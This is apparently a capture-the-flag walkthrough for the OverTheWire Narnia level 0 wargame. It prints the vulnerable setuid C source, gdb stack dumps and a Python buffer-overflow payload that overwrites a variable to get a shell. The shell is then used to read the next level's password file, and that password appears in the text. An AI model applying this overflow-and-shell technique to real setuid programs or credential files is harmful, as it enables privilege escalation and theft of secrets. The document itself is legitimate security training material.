Log in into the game:
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226 # password narnia0
```
Explore the file system:
```bash
narnia0@narnia:~$ ls
narnia0@narnia:~$ pwd
/home/narnia0
```
Nothing here, continue exploring and found:
```bash
narnia0@narnia:/narnia$ cd /narnia/
narnia0@narnia:/narnia$ ls
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
```
permissions inform that likely, we'll need to crack narnia0.c:
```
narnia0@narnia:/narnia$ ls -l
total 108
-r-sr-x--- 1 narnia1 narnia0 7568 Nov  9 15:08 narnia0
-r--r----- 1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 7404 Nov  9 15:08 narnia1
-r--r----- 1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 5164 Nov  9 15:08 narnia2
-r--r----- 1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 5836 Nov  9 15:08 narnia3
-r--r----- 1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 5336 Nov  9 15:08 narnia4
-r--r----- 1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 5700 Nov  9 15:08 narnia5
-r--r----- 1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 6076 Nov  9 15:08 narnia6
-r--r----- 1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 6676 Nov  9 15:08 narnia7
-r--r----- 1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 5232 Nov  9 15:08 narnia8
-r--r----- 1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
```
Let's analyze the code of `narnia0.c`:
```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
While debugging, here's the memory:
```
(gdb) p &buf
$1 = (char (*)[20]) 0x7fffffffe4a0
(gdb) p $rsp
$2 = (void *) 0x7fffffffe4a0
(gdb) x/64x $rsp
0x7fffffffe4a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe4b0:	0x004007c0	0x00000000	0x41414141	0x00000000
0x7fffffffe4c0:	0xffffe5b0	0x00007fff	0x00000000	0x00000000
0x7fffffffe4d0:	0x004007c0	0x00000000	0xf7a2d830	0x00007fff
0x7fffffffe4e0:	0x00000000	0x00000000	0xffffe5b8	0x00007fff
0x7fffffffe4f0:	0x00000000	0x00000001	0x004006ed	0x00000000
0x7fffffffe500:	0x00000000	0x00000000	0x47dc9386	0x6163f3c9
0x7fffffffe510:	0x00400600	0x00000000	0xffffe5b0	0x00007fff
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x819c9386	0x9e9c0cb6	0xe78c9386	0x9e9c1c0c
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000001	0x00000000
0x7fffffffe560:	0x004006ed	0x00000000	0x00400830	0x00000000
0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe580:	0x00400600	0x00000000	0xffffe5b0	0x00007fff
0x7fffffffe590:	0x00000000	0x00000000	0x00400629	0x00000000
```
Overflowing `buf` we can rewrite the `val` value:
```bash
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ python -c 'print("B"*20  +"\xef\xbe\xad\xde")' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef

```

Yet, nothing happens.

Let's debug it out to check what's going on in more detail:
```bash
export DIR=$(mktemp -d)
cd $DIR
narnia0@narnia:/tmp/tmp.S0yOD98OVW$ python -c 'print("B"*20  +"\xef\xbe\xad\xde")' > input
narnia0@narnia:/tmp/tmp.S0yOD98OVW$ cp /narnia/narnia0 .
narnia0@narnia:/tmp/tmp.S0yOD98OVW$ cp /narnia/narnia0.c .
# compile without stack protection mechanisms
narnia0@narnia:/tmp/tmp.S0yOD98OVW$ gcc -g narnia0.c -o narnia0gdb -fno-stack-protector -z execstack
# debug it
narnia0@narnia:/tmp/tmp.S0yOD98OVW$ gdb narnia0gdb
(gdb) b 30
Breakpoint 1 at 0x400759: file narnia0.c, line 30.
(gdb) r < input
Starting program: /tmp/tmp.S0yOD98OVW/narnia0gdb < input
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0x41414100

Breakpoint 1, main () at narnia0.c:30
30		if(val==0xdeadbeef){
(gdb) x/64x $rsp
0x7fffffffe480:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe490:	0x42424242	0xdeadbeef	0x41414100	0x00000000
0x7fffffffe4a0:	0xffffe590	0x00007fff	0x00000000	0x00000000
0x7fffffffe4b0:	0x004007c0	0x00000000	0xf7a2d830	0x00007fff
0x7fffffffe4c0:	0x00000000	0x00000000	0xffffe598	0x00007fff
0x7fffffffe4d0:	0x00000000	0x00000001	0x004006ed	0x00000000
0x7fffffffe4e0:	0x00000000	0x00000000	0x623e0e6c	0x8f1a718d
0x7fffffffe4f0:	0x00400600	0x00000000	0xffffe590	0x00007fff
0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe510:	0xa43e0e6c	0x70e58ef2	0xc26e0e6c	0x70e59e48
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00000001	0x00000000
0x7fffffffe540:	0x004006ed	0x00000000	0x00400830	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00400600	0x00000000	0xffffe590	0x00007fff
0x7fffffffe570:	0x00000000	0x00000000	0x00400629	0x00000000
```
We are 4 characters short. Let's see what happens if we append 4 additional characters.
Reason behind it is the compilation flags. Adding `-m32` does it and the code can be exploited
with the usual input:
```
(python -c 'print("B"*20  +"\xef\xbe\xad\xde")') | ./narnia0gdb32
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef
```

Debugging though the code we can see that the shell is getting invoked however it goes to `return 0;`
automatically afterwards. Without getting into too difficult mechanisms, let's be a bit creative:
```bash
(python -c 'print("B"*20  +"\xef\xbe\xad\xde")'; whoami) | ./narnia0gdb32
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef
/bin/sh: 1: narnia0: not found

```bash
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ (python -c 'print("B"*20  +"\xef\xbe\xad\xde")'; ls) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef
/bin/sh: 1: narnia0: not found
/bin/sh: 2: narnia0.c: not found
/bin/sh: 3: narnia1: not found
/bin/sh: 4: narnia1.c: not found
/bin/sh: 5: narnia2: not found
/bin/sh: 6: narnia2.c: not found
/bin/sh: 7: narnia3: not found
/bin/sh: 8: narnia3.c: not found
/bin/sh: 9: narnia4: not found
/bin/sh: 10: narnia4.c: not found
/bin/sh: 11: narnia5: not found
/bin/sh: 12: narnia5.c: not found
/bin/sh: 13: narnia6: not found
/bin/sh: 14: narnia6.c: not found
/bin/sh: 15: narnia7: not found
/bin/sh: 16: narnia7.c: not found
/bin/sh: 17: narnia8: not found
/bin/sh: 18: narnia8.c: not found

```
Getting interactive through `cat`:

```bash
narnia0@narnia:~$ (python -c 'print("B"*20  +"\xef\xbe\xad\xde")'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef
whoami
narnia1

```

It seems privileges have been raised narnia1. Now it's time to find the password for the next level:
```bash
narnia0@narnia:/narnia$ cd /
narnia0@narnia:/$ du -a|grep narnia
du: cannot read directory './etc/ssl/private': Permission denied
4	./etc/narnia_pass/narnia5
4	./etc/narnia_pass/narnia6
4	./etc/narnia_pass/narnia7
4	./etc/narnia_pass/narnia0
4	./etc/narnia_pass/narnia4
4	./etc/narnia_pass/narnia1
4	./etc/narnia_pass/narnia9
4	./etc/narnia_pass/narnia2
4	./etc/narnia_pass/narnia3
4	./etc/narnia_pass/narnia8
44	./etc/narnia_pass
du: cannot read directory './etc/polkit-1/localauthority': Permission denied
du: cannot read directory './run/lxcfs': Permission denied
du: cannot read directory './run/user/14002': Permission denied
du: cannot read directory './run/user/14001': Permission denied
du: cannot read directory './run/user/14006': Permission denied
du: cannot read directory './run/user/14008': Permission denied
du: cannot read directory './run/user/14007': Permission denied
du: cannot read directory './run/sudo': Permission denied
du: cannot read directory './run/log/journal/0d8e66480c320675a338622759f86ace': Permission denied
du: cannot read directory './run/lvm': Permission denied
du: cannot read directory './run/systemd/inaccessible': Permission denied
du: cannot read directory './run/lock/lvm': Permission denied
du: cannot read directory './dev/mqueue': Permission denied
du: cannot read directory './dev/shm': Permission denied
^C

```

`/etc/narnia_pass/narnia1` sounds like the right file which of course, it's unreacheable unless you're `narnia1` user:

```bash
narnia0@narnia:/$ cat /etc/narnia_pass/narnia1
cat: /etc/narnia_pass/narnia1: Permission denied
narnia0@narnia:/$ ls -l /etc/narnia_pass/narnia1
-r-------- 1 narnia1 narnia1 11 Nov  9 15:08 /etc/narnia_pass/narnia1
```

but, we can do so through the previous method so let's do it:

```
narnia0@narnia:/$ (python -c 'print("B"*20  +"\xef\xbe\xad\xde")'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ?
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
efeidiedae

```

### Resources
- http://tutorialsjunkie.blogspot.com.es/2018/02/overthewire-narnia-walkthrough.html
- https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria0
- https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia
- http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html
- https://hackmethod.com/overthewire-narnia-0/
